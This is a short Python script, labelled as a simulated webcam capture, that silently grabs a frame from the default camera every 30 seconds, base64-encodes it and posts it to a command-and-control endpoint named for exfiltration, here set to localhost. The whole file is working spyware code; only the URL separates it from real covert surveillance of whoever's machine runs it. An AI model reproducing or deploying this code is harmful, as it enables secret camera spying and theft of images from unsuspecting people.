# Simulated webcam capture
import cv2, requests, base64, time

C2 = "http://127.0.0.1:8443/exfil"
cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
while True:
    ret, frame = cam.read()
    if ret:
        _, buf = cv2.imencode(".jpg", frame)
        blob = base64.b64encode(buf.tobytes()).decode()
        requests.post(C2, data={"img": blob})
    time.sleep(30)
